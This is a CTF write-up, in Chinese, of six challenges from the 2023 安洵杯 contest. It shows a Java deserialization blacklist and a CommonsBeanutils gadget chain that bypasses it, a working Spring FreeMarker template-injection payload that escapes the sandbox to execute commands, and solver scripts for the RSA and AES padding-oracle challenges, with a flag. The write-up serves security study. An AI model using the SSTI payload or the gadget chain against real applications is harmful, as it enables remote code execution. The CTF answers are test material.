---
title: 2023 安洵杯 WriteUp By Mini-Venom
contest: 安洵杯 2023
year: 2023
difficulty: medium
vuln_type: deserialize
tags: [CommonsBeanutils, PropertyUtilsBean反射, BeanComparator, TiedMapEntry, BadAttributeValueExpException, 黑名单绕过, Spring FreeMarker, AES_padding_oracle, go位置映射, RSA_CRT]
attack_chain:
  - ezJava: 黑名单 (jndi/jackson/spring/JdbcRowSetImpl/SignedObject/TemplatesImpl/Runtime/ProcessBuilder/PriorityQueue) 全 ban
  - 走 PropertyUtilsBean 反射 + BeanComparator + TiedMapEntry
  - BadAttributeValueExpException.readObject → TiedMapEntry.toString → LazyMap.get → BeanComparator.compare → PropertyUtilsBean.getProperty → invoke Method → getConnection
  - PostgreSQL 攻击链
  - Spring FreeMarker: springMacroRequestContext.webApplicationContext → freeMarkerConfiguration → setNewBuiltinClassResolver
  - ${"freemarker.template.utility.Execute"?new()("id")} 模板执行
  - D0g3 RSA: 已知 p 二进制，p[i]=0 改 1 试 q = p+2^(len-i-1) 或 q0
  - gcd(q, n) 或 gcd(q0, n) 验证因式分解
  - AES padding oracle: pt[::-1] 后 N 个 num 字符结尾则 True
  - 爆破每个 ASCII 字符
  - go/kotlin: position_map 位置映射 38 字符
  - CRT RSA: p-q 已知，二次方程求 p, q, r
key_payload: 'PGConnectionPoolDataSource.getPooledConnection → invoke Method'
one_liner: 6 道综合：CommonsBeanutils 反射 + Spring FreeMarker + RSA 位翻转 + AES padding oracle + CRT RSA。
lesson: 黑名单 ban 反射 + Runtime + TemplatesImpl 改用 PropertyUtilsBean；FreeMarker 用 springMacroRequestContext 绕沙箱。
quality: high
---

# 2023 安洵杯 WriteUp By Mini-Venom

## 来源
- 原文：ctfiot.com/153097.html
- 团队：ChaMd5 Venom（Mini-Venom）

## 6 道题详解

### 1. ezJava（黑名单绕过 + CommonsBeanutils）
**黑名单**：
```java
static {
    BLACKLIST.add("com.sun.jndi");
    BLACKLIST.add("com.fasterxml.jackson");
    BLACKLIST.add("org.springframework");
    BLACKLIST.add("com.sun.rowset.JdbcRowSetImpl");
    BLACKLIST.add("java.security.SignedObject");
    BLACKLIST.add("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
    BLACKLIST.add("java.lang.Runtime");
    BLACKLIST.add("java.lang.ProcessBuilder");
    BLACKLIST.add("java.util.PriorityQueue");
}
```

**绕过链**：
- `BadAttributeValueExpException.readObject` → `TiedMapEntry.toString` → `LazyMap.get` → `BeanComparator.compare` → `PropertyUtils.getProperty` → `Method.invoke`
- 走 `PropertyUtilsBean.getNestedProperty` → `getSimpleProperty` → `invokeMethod`
- 攻击 `PGConnectionPoolDataSource.getPooledConnection`

### 2. Spring FreeMarker SSTI
```java
spring.freemarker.expose-spring-macro-helpers=true
```
```ftl
<#assign ac=springMacroRequestContext.webApplicationContext>
<#assign fc=ac.getBean('freeMarkerConfiguration')>
<#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>
<#assign VOID=fc.setNewBuiltinClassResolver(dcr)>
${"freemarker.template.utility.Execute"?new()("id")}
```
- 禁用沙箱后 Execute 任意命令

### 3. D0g3 RSA（位翻转因式分解）
```python
p = 0bxx  # 已知 p 二进制
p1, p2 = list(p[:1024]), list(p[1024:])
# 随机翻转 1 位变 0，0 位变 1
for i in range(1024):
    for j in range(1024, 2048):
        if p[j] == '1' and p[i] == '0' and p[j-1024] == '0':
            q = int(p, 2) + pow(2, len(p) - i - 1)
            q0 = q - pow(2, len(p) - j - 1)
            if gcd(n, q) == q: d = inverse(e, q-1)
            elif gcd(q0, n) == q0: d = inverse(e, q0-1)
            flag = long_to_bytes(pow(c, d, q))
            if b'D0g3{' in flag: print(flag)
```

### 4. AES padding oracle
```python
def asserts(pt: bytes):
    num = pt[-1]
    if len(pt) == 16:
        result = pt[::-1]
        count = 0
        for i in result:
            if i == num: count += 1
            else: break
        if count == num: return True
        return False
```
- 爆破每个 ASCII 字符
- flag: `D0g3{0P@d4Ttk}`

### 5. CRT RSA
```python
f = inv_p * x**2 + (2*inv_q*inv_p - 1 - p_q) * x + inv_q*(inv_p*inv_q - 1)
X = f.roots()
k1 = X[1]
p = inv_q + k1
q = p_q // p
m11 = pow(c1, (p+1)//4, p)
m12 = pow(c1, (q+1)//4, q)
m13 = pow(c1, (r+1)//4, r)
phi = (p-1)*(q-1)*(r-1)
d2 = gmpy2.invert(e2, phi)
m = gmpy2.powmod(c2, int(d2), n)
```

### 6. go/kotlin 位置映射
```python
position_map = {
    0: 26, 1: 17, 2: 21, 3: 31, 4: 36, 5: 15, 6: 27, 7: 19, 8: 24, 9: 6,
    10: 10, 11: 2, 12: 12, 13: 35, 14: 4, 15: 9, 16: 16, 17: 37, 18: 18, 19: 7,
    20: 20, 21: 0, 22: 23, 23: 22, 24: 13, 25: 14, 26: 25, 27: 30, 28: 11, 29: 3,
    30: 8, 31: 29, 32: 32, 33: 33, 34: 1, 35: 34, 36: 28, 37: 5
}
```

## 关键技巧
- **CommonsBeanutils 反射**：PropertyUtilsBean.getProperty + BeanComparator
- **PostgreSQL 反序列化**：PGConnectionPoolDataSource.getConnection
- **Spring FreeMarker 沙箱绕过**：setNewBuiltinClassResolver
- **RSA 位翻转**：p 二进制翻转 1 位
- **AES padding oracle**：爆破每个字符
- **CRT RSA**：p, q, r 三素数 + 二次方程

## 适用场景
- Java 黑名单绕过
- Spring 模板注入
- RSA 位错误利用
- AES padding 攻击
- 多元 RSA + CRT
